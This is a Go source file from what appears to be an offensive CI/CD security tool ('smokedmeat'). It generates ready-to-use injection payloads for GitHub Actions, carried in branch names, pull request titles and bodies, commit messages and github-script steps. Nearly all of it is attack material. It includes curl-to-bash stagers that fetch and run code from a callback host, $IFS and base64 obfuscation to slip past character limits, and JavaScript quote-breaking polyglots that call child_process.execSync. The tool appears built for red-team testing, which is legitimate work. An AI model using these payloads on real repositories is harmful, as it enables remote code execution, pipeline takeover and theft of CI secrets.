// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package rye

import (
	"fmt"

	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

// LightRye is the main interface for injection payload generation.
// It supports three modes of operation:
// - Manual: Building blocks for experts
// - SemiAuto: Insight + editable templates
// - FullAuto: Menu -> preview -> execute
type LightRye struct {
	KitchenURL string
	Mode       Mode
}

// NewLightRye creates a new LightRye instance.
func NewLightRye(kitchenURL string) *LightRye {
	return &LightRye{
		KitchenURL: kitchenURL,
		Mode:       ModeFullAuto,
	}
}

// SetMode changes the automation mode.
func (lr *LightRye) SetMode(mode Mode) {
	lr.Mode = mode
}

// MenuItem represents an option in the full-auto menu.
type MenuItem struct {
	ID          string        // Unique identifier
	Name        string        // Display name
	Context     string        // Injection context (pr_title, git_branch, etc.)
	Description string        // What this does
	Payload     StagerPayload // The ready-to-use payload
	Preview     string        // Short preview of the payload
	Constraints []string      // Character/length constraints
}

// Menu returns available injection options for full-auto mode.
// Each item is a ready-to-use payload that can be previewed and executed.
func (lr *LightRye) Menu() []MenuItem {
	var items []MenuItem

	// Git branch name injection (heavily constrained)
	branchStager := BranchNameStager(lr.KitchenURL)
	branchPayload := branchStager.Generate()
	items = append(items, MenuItem{
		ID:          "branch_ifs",
		Name:        "Git Branch Name (IFS)",
		Context:     "git_branch",
		Description: "Inject via git branch name using $IFS encoding",
		Payload:     branchPayload,
		Preview:     truncate(branchPayload.Raw, 60),
		Constraints: []string{"no spaces", "no ~^:?*[@", "max ~250 chars"},
	})

	// PR Title injection
	prTitleStager := PRTitleStager(lr.KitchenURL)
	prTitlePayload := prTitleStager.Generate()
	items = append(items, MenuItem{
		ID:          "pr_title",
		Name:        "PR Title",
		Context:     "pr_title",
		Description: "Inject via pull request title",
		Payload:     prTitlePayload,
		Preview:     truncate(prTitlePayload.Raw, 60),
		Constraints: []string{"single line", "max 256 chars"},
	})

	// PR Body injection (most flexible)
	prBodyStager := PRBodyStager(lr.KitchenURL)
	prBodyPayload := prBodyStager.Generate()
	items = append(items, MenuItem{
		ID:          "pr_body",
		Name:        "PR Body",
		Context:     "pr_body",
		Description: "Inject via pull request body (most flexible)",
		Payload:     prBodyPayload,
		Preview:     truncate(prBodyPayload.Raw, 60),
		Constraints: []string{"multiline OK", "max 65536 chars"},
	})

	// GitHub Script (JS context) - universal polyglot for both " and ' contexts
	ghScriptStager := GitHubScriptStager(lr.KitchenURL)
	ghScriptPayload := ghScriptStager.GeneratePolyglot()
	items = append(items, MenuItem{
		ID:          "github_script",
		Name:        "GitHub Script (JS Polyglot)",
		Context:     "github_script",
		Description: "Universal polyglot for actions/github-script - works in both single and double quote contexts",
		Payload:     ghScriptPayload,
		Preview:     truncate(ghScriptPayload.Raw, 60),
		Constraints: []string{"works in \" and ' contexts"},
	})

	// Commit message
	commitStager := NewStager(lr.KitchenURL, CommitMessage)
	commitPayload := commitStager.Generate()
	items = append(items, MenuItem{
		ID:          "commit_message",
		Name:        "Commit Message",
		Context:     "commit_message",
		Description: "Inject via git commit message",
		Payload:     commitPayload,
		Preview:     truncate(commitPayload.Raw, 60),
		Constraints: []string{"first line ~72 chars", "multiline OK"},
	})

	return items
}

// InsightItem represents analysis for semi-auto mode.
type InsightItem struct {
	Context      string   // Injection context
	IsPossible   bool     // Whether injection is viable
	Constraints  []string // Character/length constraints
	Template     string   // Editable template payload
	Placeholders []string // What needs to be filled in
	Suggestions  []string // Recommended modifications
}

// Insight analyzes a context and returns editable templates for semi-auto mode.
func (lr *LightRye) Insight(contextName string) (*InsightItem, error) {
	ctx, ok := GetContextByName(contextName)
	if !ok {
		return nil, fmt.Errorf("unknown context: %s", contextName)
	}

	stager := NewStager(lr.KitchenURL, ctx)
	payload := stager.Generate()

	insight := &InsightItem{
		Context:    contextName,
		IsPossible: true,
		Template:   payload.Raw,
	}

	// Build constraints list
	if ctx.MaxLength > 0 {
		insight.Constraints = append(insight.Constraints, fmt.Sprintf("max %d chars", ctx.MaxLength))
	}
	if !ctx.Multiline {
		insight.Constraints = append(insight.Constraints, "single line only")
	}
	if len(ctx.ForbiddenChars) > 0 {
		insight.Constraints = append(insight.Constraints, fmt.Sprintf("forbidden: %s", string(ctx.ForbiddenChars)))
	}

	// Add placeholders and suggestions based on context
	switch ctx.Language {
	case LangJavaScript:
		insight.Placeholders = []string{"CALLBACK_URL", "COMMAND"}
		insight.Suggestions = []string{
			"Use process.mainModule.require for sandbox bypass",
			"Consider async execution with setTimeout",
		}
	default:
		insight.Placeholders = []string{"CALLBACK_URL", "COMMAND"}
		insight.Suggestions = []string{
			"Use $IFS for space-constrained contexts",
			"Base64-encode URLs to avoid special chars",
			"Consider wget fallback if curl unavailable",
		}
	}

	return insight, nil
}

// BuildingBlock represents a component for manual mode.
type BuildingBlock struct {
	Name        string // e.g., "IFS_SPACE", "BASE64_URL", "CURL_BASH"
	Template    string // The template with placeholders
	Example     string // Filled-in example
	Description string // What this does
}

// BuildingBlocks returns components for manual assembly.
func (lr *LightRye) BuildingBlocks() []BuildingBlock {
	callbackURL := stagerurl.Join(lr.KitchenURL, "STAGER_ID")

	return []BuildingBlock{
		{
			Name:        "IFS_SPACE",
			Template:    "${IFS}",
			Example:     "curl${IFS}-s${IFS}URL",
			Description: "Replace spaces with $IFS for constrained contexts",
		},
		{
			Name:        "BASE64_URL",
			Template:    "$(base64${IFS}-d<<<'ENCODED')",
			Example:     fmt.Sprintf("$(base64${IFS}-d<<<'%s')", "aHR0cDovL2V4YW1wbGUuY29t"),
			Description: "Base64-decode a URL to avoid special chars",
		},
		{
			Name:        "CURL_BASH",
			Template:    "$(curl${IFS}-s${IFS}URL|bash)",
			Example:     fmt.Sprintf("$(curl${IFS}-s${IFS}%s|bash)", callbackURL),
			Description: "Fetch and execute bash script from URL",
		},
		{
			Name:        "CURL_BASH_IFS_B64",
			Template:    "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'ENCODED')|bash)",
			Example:     "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0...')|bash)",
			Description: "Full IFS+base64 stager for branch names",
		},
		{
			Name:        "BACKTICK_SUB",
			Template:    "`COMMAND`",
			Example:     "`curl -s URL|bash`",
			Description: "Classic command substitution",
		},
		{
			Name:        "DOLLAR_PAREN_SUB",
			Template:    "$(COMMAND)",
			Example:     "$(curl -s URL|bash)",
			Description: "Modern command substitution",
		},
		{
			Name:        "JS_QUOTE_POLYGLOT",
			Template:    `";require('child_process').execSync('COMMAND');/*';require('child_process').execSync('COMMAND');//*/`,
			Example:     `";require('child_process').execSync('curl -s URL|bash');/*';require('child_process').execSync('curl -s URL|bash');//*/`,
			Description: "Universal polyglot - works in both single AND double quote JS contexts",
		},
		{
			Name:        "JS_BREAK_SINGLE",
			Template:    "');require('child_process').execSync('COMMAND');('",
			Example:     "');require('child_process').execSync('curl -s URL|bash');('",
			Description: "Break out of single quotes in JS",
		},
		{
			Name:        "JS_BREAK_TEMPLATE",
			Template:    "`);require('child_process').execSync('COMMAND');(`",
			Example:     "`);require('child_process').execSync('curl -s URL|bash');(`",
			Description: "Break out of template literal in JS",
		},
		{
			Name:        "QUOTE_BREAK_DOUBLE",
			Template:    "\";COMMAND;\"",
			Example:     "\";curl -s URL|bash;\"",
			Description: "Break out of double quotes in bash",
		},
		{
			Name:        "NEWLINE_INJECT",
			Template:    "\nCOMMAND\n",
			Example:     "\ncurl -s URL|bash\n",
			Description: "Newline injection for multiline contexts",
		},
		{
			Name:        "PIPE_CHAIN",
			Template:    "|COMMAND",
			Example:     "|curl -s URL|bash",
			Description: "Pipe to command",
		},
		{
			Name:        "AND_CHAIN",
			Template:    "&&COMMAND",
			Example:     "&&curl -s URL|bash",
			Description: "AND chain (execute if previous succeeds)",
		},
		{
			Name:        "OR_CHAIN",
			Template:    "||COMMAND",
			Example:     "||curl -s URL|bash",
			Description: "OR chain (execute if previous fails)",
		},
	}
}

// QuickStager generates a ready-to-use stager for a context (full-auto convenience).
func (lr *LightRye) QuickStager(contextName string) (*StagerPayload, error) {
	ctx, ok := GetContextByName(contextName)
	if !ok {
		return nil, fmt.Errorf("unknown context: %s", contextName)
	}

	stager := NewStager(lr.KitchenURL, ctx)
	payload := stager.Generate()
	return &payload, nil
}

// truncate shortens a string for preview.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}
